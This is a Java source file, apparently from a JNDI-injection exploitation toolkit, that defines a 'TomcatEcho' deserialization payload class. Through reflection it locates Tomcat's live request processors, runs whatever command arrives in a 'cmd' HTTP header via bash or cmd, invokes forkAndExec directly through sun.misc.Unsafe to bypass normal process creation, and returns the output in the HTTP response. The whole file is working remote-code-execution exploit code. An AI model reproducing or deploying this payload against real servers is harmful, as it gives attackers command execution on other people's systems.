package com.qi4l.jndi.template.echo;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import sun.misc.Unsafe;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class TomcatEcho extends AbstractTranslet {

    public TomcatEcho(){
        try {
            boolean                 flag  = false;
            ThreadGroup             group = Thread.currentThread().getThreadGroup();
            java.lang.reflect.Field f     = group.getClass().getDeclaredField("threads");
            f.setAccessible(true);
            Thread[] threads = (Thread[]) f.get(group);
            for (int i = 0; i < threads.length; i++) {
                try {
                    Thread t = threads[i];
                    if (t == null) continue;
                    String str = t.getName();
                    if (str.contains("exec") || !str.contains("http")) continue;
                    f = t.getClass().getDeclaredField("target");
                    f.setAccessible(true);
                    Object obj = f.get(t);
                    if (!(obj instanceof Runnable)) continue;
                    f = obj.getClass().getDeclaredField("this$0");
                    f.setAccessible(true);
                    obj = f.get(obj);
                    try {
                        f = obj.getClass().getDeclaredField("handler");
                    } catch (NoSuchFieldException e) {
                        f = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                    }
                    f.setAccessible(true);
                    obj = f.get(obj);
                    try {
                        f = obj.getClass().getSuperclass().getDeclaredField("global");
                    } catch (NoSuchFieldException e) {
                        f = obj.getClass().getDeclaredField("global");
                    }
                    f.setAccessible(true);
                    obj = f.get(obj);
                    f = obj.getClass().getDeclaredField("processors");
                    f.setAccessible(true);
                    java.util.List processors = (java.util.List) (f.get(obj));
                    for (int j = 0; j < processors.size(); ++j) {
                        Object processor = processors.get(j);
                        f = processor.getClass().getDeclaredField("req");
                        f.setAccessible(true);
                        Object req  = f.get(processor);
                        Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req);
                        str = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"cmd"});
                        if (str != null && !str.isEmpty()) {
                            resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Integer(200));

                            String[] cmds = null;
                            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                                cmds = new String[]{"cmd", "/c", str};
                            } else {
                                cmds = new String[]{"/bin/bash", "-c", str};
                            }
                            Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
                            theUnsafeField.setAccessible(true);
                            Unsafe unsafe = (Unsafe) theUnsafeField.get(null);

                            Class processClass = null;

                            try {
                                processClass = Class.forName("java.lang.UNIXProcess");
                            } catch (ClassNotFoundException e) {
                                processClass = Class.forName("java.lang.ProcessImpl");
                            }

                            Object   processObject = unsafe.allocateInstance(processClass);
                            byte[][] args          = new byte[cmds.length - 1][];
                            int      size          = args.length;

                            for (int k = 0; k < args.length; k++) {
                                args[k] = cmds[k + 1].getBytes();
                                size += args[k].length;
                            }

                            byte[] argBlock = new byte[size];
                            int    l        = 0;

                            for (byte[] arg : args) {
                                System.arraycopy(arg, 0, argBlock, l, arg.length);
                                l += arg.length + 1;
                            }

                            int[] envc                 = new int[1];
                            int[] std_fds              = new int[]{-1, -1, -1};
                            Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
                            Field helperpathField      = processClass.getDeclaredField("helperpath");
                            launchMechanismField.setAccessible(true);
                            helperpathField.setAccessible(true);
                            Object launchMechanismObject = launchMechanismField.get(processObject);
                            byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);

                            int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);

                            Method forkMethod = processClass.getDeclaredMethod("forkAndExec", int.class, byte[].class, byte[].class, byte[].class, int.class,
                                    byte[].class, int.class, byte[].class, int[].class, boolean.class);

                            forkMethod.setAccessible(true);//

                            forkMethod.invoke(processObject, ordinal + 1, helperpathObject, toCString(cmds[0]), argBlock, args.length,
                                    null, envc[0], null, std_fds, false);

                            Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
                            initStreamsMethod.setAccessible(true);
                            initStreamsMethod.invoke(processObject, std_fds);

                            Method getInputStreamMethod = processClass.getMethod("getInputStream");
                            getInputStreamMethod.setAccessible(true);
                            InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);

                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            int                   a    = 0;
                            byte[]                b    = new byte[1024];

                            while ((a = in.read(b)) != -1) {
                                baos.write(b, 0, a);
                            }

                            try {
                                Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
                                obj = cls.newInstance();
                                cls.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(obj, baos.toByteArray(), new Integer(0), baos.toByteArray().length);
                                resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, obj);
                            } catch (NoSuchMethodException var5) {
                                Class cls = Class.forName("java.nio.ByteBuffer");
                                obj = cls.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(cls, new Object[]{baos.toByteArray()});
                                resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, obj);
                            }
                            flag = true;
                            flag = true;
                        }
                        if (flag) break;
                    }
                    if (flag) break;
                } catch (Exception ignored) {
                }
            }

        } catch (Exception ignored) {
        }
    }

    public static byte[] toCString(String s) {
        if (s == null)
            return null;
        byte[] bytes  = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0,
                result, 0,
                bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    static {
        try {
            boolean                 flag   = false;
            ThreadGroup             group  = Thread.currentThread().getThreadGroup();
            ClassLoader             loader = Thread.currentThread().getContextClassLoader();
            java.lang.reflect.Field f      = group.getClass().getDeclaredField("threads");
            f.setAccessible(true);
            Thread[] threads = (Thread[]) f.get(group);
            for (int i = 0; i < threads.length; i++) {
                try {
                    Thread t = threads[i];
                    if (t == null) continue;
                    String str = t.getName();
                    if (str.contains("exec") || !str.contains("http")) continue;
                    f = t.getClass().getDeclaredField("target");
                    f.setAccessible(true);
                    Object obj = f.get(t);
                    if (!(obj instanceof Runnable)) continue;
                    f = obj.getClass().getDeclaredField("this$0");
                    f.setAccessible(true);
                    obj = f.get(obj);
                    try {
                        f = obj.getClass().getDeclaredField("handler");
                    } catch (NoSuchFieldException e) {
                        f = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                    }
                    f.setAccessible(true);
                    obj = f.get(obj);
                    try {
                        f = obj.getClass().getSuperclass().getDeclaredField("global");
                    } catch (NoSuchFieldException e) {
                        f = obj.getClass().getDeclaredField("global");
                    }
                    f.setAccessible(true);
                    obj = f.get(obj);
                    f = obj.getClass().getDeclaredField("processors");
                    f.setAccessible(true);
                    java.util.List processors = (java.util.List) (f.get(obj));
                    for (int j = 0; j < processors.size(); ++j) {
                        Object processor = processors.get(j);
                        f = processor.getClass().getDeclaredField("req");
                        f.setAccessible(true);
                        Object req  = f.get(processor);
                        Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req);
                        str = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"cmd"});
                        if (str != null && !str.isEmpty()) {
                            resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Integer(200));
                            java.io.ByteArrayOutputStream baos = q(str);
                            try {
                                Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk", false, loader);
                                obj = cls.newInstance();
                                cls.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(obj, baos.toByteArray(), new Integer(0), baos.toByteArray().length);
                                resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, obj);
                            } catch (NoSuchMethodException var5) {
                                Class cls = Class.forName("java.nio.ByteBuffer", false, loader);
                                obj = cls.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(cls, new Object[]{baos.toByteArray()});
                                resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, obj);
                            }
                            flag = true;
                        }
                        if (flag) break;
                    }
                    if (flag) break;
                } catch (Exception ignored) {
                }
            }

        } catch (Exception ignored) {
        }
    }

    public static java.io.ByteArrayOutputStream q(String cmd) {
        return null;
    }
}
